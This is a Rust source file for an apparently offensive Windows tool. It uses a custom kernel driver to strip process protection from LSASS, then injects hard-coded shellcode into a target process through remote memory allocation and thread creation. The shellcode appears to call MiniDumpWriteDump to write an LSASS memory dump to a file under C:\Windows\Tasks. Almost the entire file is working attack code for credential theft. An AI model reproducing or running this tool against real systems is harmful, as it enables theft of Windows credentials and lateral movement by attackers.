use std::{ptr, ffi::c_void};

use sysinfo::{System, SystemExt, ProcessExt};
use windows::{Win32::{Foundation::{HANDLE, CloseHandle, GetLastError}, Storage::FileSystem::{CreateFileA, FILE_SHARE_WRITE, OPEN_EXISTING, FILE_FLAGS_AND_ATTRIBUTES}, System::{IO::DeviceIoControl, Threading::{GetCurrentProcessId, OpenProcess, PROCESS_ALL_ACCESS, WaitForSingleObject, CreateRemoteThread}, Memory::{PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, VirtualAllocEx}, Diagnostics::Debug::WriteProcessMemory}}, core::s};


#[derive(Debug)]
#[repr(C)]
struct ProcessIDs {
    current_process_id: u32,
    target_process_id: u32,
}

macro_rules! CTL_CODE {
    ($DeviceType:expr, $Function:expr, $Method:expr, $Access:expr) => {
        ($DeviceType << 16) | ($Access << 14) | ($Function << 2) | $Method
    };
}

fn main() {

    let args: Vec<String> = std::env::args().collect();
    if args.len() != 2 {
        println!("Usage: ./lvlchg_client <target_pid>");
        return;
    }

    let target_pid: u32 = args[1].parse::<u32>().unwrap();

    const LVL_CHG_DEVICE: i32 = 0x8000;
    const METHOD_NEITHER: i32 = 3;
    const FILE_ANY_ACCESS: i32 = 0;
    const GENERIC_WRITE: u32 = 0x40000000;

    const IOCTL_LVL_CHG_PROC: i32 = CTL_CODE!(LVL_CHG_DEVICE, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS);

    println!("[+] Obtaining handle to lvlchg driver");

    unsafe {
        let h_driv: HANDLE = CreateFileA(
            s!("\\\\.\\LvlChg"),
            GENERIC_WRITE,
            FILE_SHARE_WRITE,
            Some(ptr::null_mut()),
            OPEN_EXISTING,
            FILE_FLAGS_AND_ATTRIBUTES(0),
            HANDLE::default()
        ).unwrap();
        println!("OK");

        println!("[*] Finding PID for LSASS");
        let lsass_pid: u32 = find_lsass_pid();
        if lsass_pid == 0 {
            println!("[!] Could not find LSASS PID!");
            return;
        }
        println!("Found! {}", lsass_pid);

        let pids: ProcessIDs = ProcessIDs {
            current_process_id: GetCurrentProcessId(),
            target_process_id: lsass_pid,
        };

        let ppids: *mut c_void = std::mem::transmute::<&ProcessIDs, *mut c_void>(&pids);
        let mut out_bytes: u32 = 0;

        if DeviceIoControl(
            h_driv,
            IOCTL_LVL_CHG_PROC as u32,
            Some(ppids),
            std::mem::size_of_val(&ppids) as u32,
            Some(ptr::null_mut()),
            0,
            Some(&mut out_bytes),
            Some(ptr::null_mut())
        ).ok().is_some() {
            println!("[*] Changing process protections in kernel...OK!");
        } else {
            println!("[!] Error: {:?}", GetLastError());
        }

        CloseHandle(h_driv).unwrap();

        println!("[*] Transforming PID to byte");
        let pid_bytes = format!("0x{:02x},0x{:02x}", lsass_pid & 0xFF, (lsass_pid >> 8) & 0xFF);
        println!("[*] Interpolating {pid_bytes} into shellcode");

        let byte_str = format!("0x48,0xb8,0x4b,0x00,0x65,0x00,0x72,0x00,0x6e,0x00,0x55,0x31,0xd2,0x48,0x89,0xe5,0x41,0x56,0x41,0x55,0x41,0x54,0x53,0x48,0xbb,0x5c,0x74,0x65,0x73,0x74,0x2e,0x64,0x6d,0x48,0x83,0xe4,0xf0,0x48,0x81,0xec,0xe0,0x00,0x00,0x00,0x48,0x89,0x84,0x24,0xa0,0x00,0x00,0x00,0x4c,0x8d,0xac,0x24,0xa0,0x00,0x00,0x00,0x48,0xb8,0x65,0x00,0x6c,0x00,0x33,0x00,0x32,0x00,0x48,0x89,0x84,0x24,0xa8,0x00,0x00,0x00,0x4c,0x89,0xe9,0x48,0xb8,0x2e,0x00,0x64,0x00,0x6c,0x00,0x6c,0x00,0x48,0x89,0x84,0x24,0xb0,0x00,0x00,0x00,0x48,0xb8,0x43,0x72,0x65,0x61,0x74,0x65,0x46,0x69,0x66,0x89,0x94,0x24,0xb8,0x00,0x00,0x00,0x48,0x89,0x44,0x24,0x43,0xc7,0x44,0x24,0x4b,0x6c,0x65,0x41,0x00,0xe8,0x29,0x02,0x00,0x00,0x48,0x8d,0x54,0x24,0x43,0x48,0x89,0xc1,0xe8,0x9c,0x02,0x00,0x00,0x45,0x31,0xc9,0x45,0x31,0xc0,0x48,0xb9,0x77,0x73,0x5c,0x54,0x61,0x73,0x6b,0x73,0x48,0xba,0x43,0x3a,0x5c,0x57,0x69,0x6e,0x64,0x6f,0x48,0x89,0x8c,0x24,0xc8,0x00,0x00,0x00,0xb9,0x70,0x00,0x00,0x00,0x48,0x89,0x94,0x24,0xc0,0x00,0x00,0x00,0xba,0x00,0x00,0x00,0xc0,0x66,0x89,0x8c,0x24,0xd8,0x00,0x00,0x00,0x48,0x8d,0x8c,0x24,0xc0,0x00,0x00,0x00,0x48,0x89,0x9c,0x24,0xd0,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0xc7,0x44,0x24,0x28,0x80,0x00,0x00,0x00,0xc7,0x44,0x24,0x20,0x02,0x00,0x00,0x00,0xff,0xd0,0x48,0x83,0xf8,0xff,0x0f,0x84,0x8c,0x01,0x00,0x00,0x4c,0x89,0xe9,0x49,0x89,0xc4,0xc7,0x44,0x24,0x57,0x65,0x73,0x73,0x00,0x48,0xb8,0x4f,0x70,0x65,0x6e,0x50,0x72,0x6f,0x63,0x48,0x89,0x44,0x24,0x4f,0xe8,0x89,0x01,0x00,0x00,0x48,0x8d,0x54,0x24,0x4f,0x48,0x89,0xc1,0xe8,0xfc,0x01,0x00,0x00,0x48,0x85,0xc0,0x0f,0x84,0x54,0x01,0x00,0x00,0x41,0xb8,{pid_bytes},0x00,0x00,0x31,0xd2,0xb9,0x38,0x04,0x00,0x00,0xff,0xd0,0x49,0x89,0xc6,0x48,0x85,0xc0,0x0f,0x84,0x39,0x01,0x00,0x00,0x48,0xb8,0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x4c,0x89,0xe9,0xc6,0x44,0x24,0x7f,0x00,0x48,0x89,0x44,0x24,0x73,0xc7,0x44,0x24,0x7b,0x61,0x72,0x79,0x41,0xe8,0x34,0x01,0x00,0x00,0x48,0x8d,0x54,0x24,0x73,0x48,0x89,0xc1,0xe8,0xa7,0x01,0x00,0x00,0x48,0x85,0xc0,0x0f,0x84,0xff,0x00,0x00,0x00,0x48,0xbb,0x44,0x62,0x67,0x63,0x6f,0x72,0x65,0x2e,0x48,0x8d,0x4c,0x24,0x5b,0xc7,0x44,0x24,0x63,0x64,0x6c,0x6c,0x00,0x48,0x89,0x5c,0x24,0x5b,0xff,0xd0,0x48,0x89,0xc1,0x48,0x85,0xc0,0x0f,0x84,0xd5,0x00,0x00,0x00,0x48,0xb8,0x4d,0x69,0x6e,0x69,0x44,0x75,0x6d,0x70,0x48,0xba,0x57,0x72,0x69,0x74,0x65,0x44,0x75,0x6d,0x48,0x89,0x84,0x24,0x80,0x00,0x00,0x00,0xb8,0x70,0x00,0x00,0x00,0x48,0x89,0x94,0x24,0x88,0x00,0x00,0x00,0x48,0x8d,0x94,0x24,0x80,0x00,0x00,0x00,0x66,0x89,0x84,0x24,0x90,0x00,0x00,0x00,0xe8,0x36,0x01,0x00,0x00,0x48,0x89,0xc3,0x48,0x85,0xc0,0x0f,0x84,0x8b,0x00,0x00,0x00,0x4c,0x89,0xe9,0xc7,0x44,0x24,0x6f,0x64,0x6c,0x65,0x00,0x48,0xb8,0x43,0x6c,0x6f,0x73,0x65,0x48,0x61,0x6e,0x48,0x89,0x44,0x24,0x67,0xe8,0x8b,0x00,0x00,0x00,0x48,0x8d,0x54,0x24,0x67,0x48,0x89,0xc1,0xe8,0xfe,0x00,0x00,0x00,0x4c,0x89,0xf1,0x4d,0x89,0xe0,0xba,{pid_bytes},0x00,0x00,0x48,0xc7,0x44,0x24,0x30,0x00,0x00,0x00,0x00,0x49,0x89,0xc5,0x41,0xb9,0x02,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x28,0x00,0x00,0x00,0x00,0x48,0xc7,0x44,0x24,0x20,0x00,0x00,0x00,0x00,0xff,0xd3,0x4c,0x89,0xe1,0x85,0xc0,0x74,0x1e,0x41,0xff,0xd5,0x4c,0x89,0xf1,0x41,0xff,0xd5,0x48,0x8d,0x65,0xe0,0x31,0xc0,0x5b,0x41,0x5c,0x41,0x5d,0x41,0x5e,0x5d,0xc3,0x66,0x0f,0x1f,0x44,0x00,0x00,0x41,0xff,0xd5,0x4c,0x89,0xf1,0x41,0xff,0xd5,0x48,0x8d,0x65,0xe0,0xb8,0x01,0x00,0x00,0x00,0x5b,0x41,0x5c,0x41,0x5d,0x41,0x5e,0x5d,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x85,0xc9,0x74,0x5e,0x48,0x8b,0x40,0x18,0x4c,0x8b,0x50,0x20,0x4c,0x8d,0x58,0x20,0x4d,0x39,0xd3,0x74,0x3a,0x90,0x4d,0x8b,0x4a,0x50,0x31,0xc0,0xeb,0x11,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x48,0x83,0xc0,0x01,0x44,0x38,0xc2,0x75,0x27,0x41,0x0f,0xb6,0x14,0x01,0x44,0x0f,0xb6,0x04,0x01,0x84,0xd2,0x75,0xe9,0x41,0x0f,0xb6,0xd0,0xf7,0xda,0x85,0xd2,0x74,0x16,0x4d,0x8b,0x12,0x4d,0x39,0xd3,0x75,0xc7,0x31,0xc0,0xc3,0x0f,0x1f,0x40,0x00,0x44,0x29,0xc2,0x85,0xd2,0x75,0xea,0x49,0x8b,0x42,0x20,0xc3,0x48,0x8b,0x40,0x10,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x55,0x49,0x89,0xd2,0x48,0x89,0xc8,0x57,0x56,0x53,0x48,0x63,0x51,0x3c,0x8b,0xb4,0x11,0x88,0x00,0x00,0x00,0x48,0x01,0xce,0x8b,0x6e,0x1c,0x48,0x01,0xcd,0x41,0xf7,0xc2,0x00,0x00,0xff,0xff,0x74,0x61,0x8b,0x5e,0x18,0x85,0xdb,0x74,0x4c,0x8b,0x56,0x20,0x45,0x31,0xdb,0x48,0x8d,0x3c,0x11,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x46,0x8b,0x0c,0x9f,0x31,0xd2,0x49,0x01,0xc1,0xeb,0x0e,0x0f,0x1f,0x44,0x00,0x00,0x48,0x83,0xc2,0x01,0x44,0x38,0xc1,0x75,0x4f,0x41,0x0f,0xb6,0x0c,0x12,0x45,0x0f,0xb6,0x04,0x11,0x84,0xc9,0x75,0xe9,0x41,0x0f,0xb6,0xc8,0xf7,0xd9,0x85,0xc9,0x74,0x3e,0x49,0x83,0xc3,0x01,0x4c,0x39,0xdb,0x75,0xc6,0x5b,0x31,0xc0,0x5e,0x5f,0x5d,0xc3,0x0f,0x1f,0x80,0x00,0x00,0x00,0x00,0x8b,0x56,0x10,0x45,0x0f,0xb7,0xd2,0x5b,0x5e,0x5f,0x49,0x29,0xd2,0x49,0xc1,0xe2,0x04,0x42,0x8b,0x54,0x15,0x00,0x5d,0x48,0x01,0xd0,0xc3,0x0f,0x1f,0x44,0x00,0x00,0x44,0x29,0xc1,0x85,0xc9,0x75,0xc2,0x8b,0x56,0x24,0x4a,0x8d,0x0c,0x58,0x5b,0x5e,0x5f,0x0f,0xb7,0x14,0x11,0x8b,0x54,0x95,0x00,0x5d,0x48,0x01,0xd0,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x31,0xc0,0xeb,0x0d,0x0f,0x1f,0x40,0x00,0x48,0x83,0xc0,0x01,0x45,0x38,0xc8,0x75,0x1f,0x44,0x0f,0xb6,0x04,0x01,0x44,0x0f,0xb6,0x0c,0x02,0x45,0x84,0xc0,0x75,0xe8,0x41,0x0f,0xb6,0xc1,0xf7,0xd8,0xc3,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x41,0x0f,0xb6,0xc0,0x44,0x29,0xc8,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00");

        let mut mini_dump_sc: Vec<u8> = Vec::new();

        for byte in byte_str.split(",") {
            let b: u8 = u8::from_str_radix(byte.trim_start_matches("0x"), 16).unwrap();
            mini_dump_sc.push(b);
        }

        println!("[*] Opening handle to target process");
        let h_proc: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, false, target_pid).unwrap();

        println!("[*] Allocating memory in target process");
        let addr: *mut c_void = VirtualAllocEx(
            h_proc,
            Some(ptr::null_mut()),
            mini_dump_sc.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if addr == ptr::null_mut() {
            println!("[!] Could not allocate memory! Error: {:?}", GetLastError());
            return;
        }
        
        println!("[*] Memory allocated at {:?}", addr);

        println!("[*] Copying {} bytes into memory", mini_dump_sc.len());

        let mut bytes_copied: usize = 0;
        WriteProcessMemory(
            h_proc,
            addr,
            mini_dump_sc.as_mut_ptr() as *mut c_void,
            mini_dump_sc.len(),
            Some(&mut bytes_copied)
        ).unwrap();

        // breakpoint();
        let e_mem: extern "system" fn(*mut c_void) -> u32 = { std::mem::transmute(addr) };

        println!("[*] Executing shellcode");
        let h_thread: HANDLE = CreateRemoteThread(
            h_proc,
            Some(ptr::null_mut()),
            0,
            Some(e_mem),
            Some(ptr::null_mut()),
            0,
            Some(ptr::null_mut())
        ).unwrap();

        WaitForSingleObject(h_thread, 500);

        CloseHandle(h_proc).unwrap();
    }
}

fn find_lsass_pid() -> u32 {
    let mut sys = System::new_all();
    sys.refresh_all();

    for (pid, process) in sys.processes() {
        if process.name().to_lowercase() == "lsass.exe" {
            return pid.to_string().parse::<u32>().unwrap();
        }
    }
    return 0;
}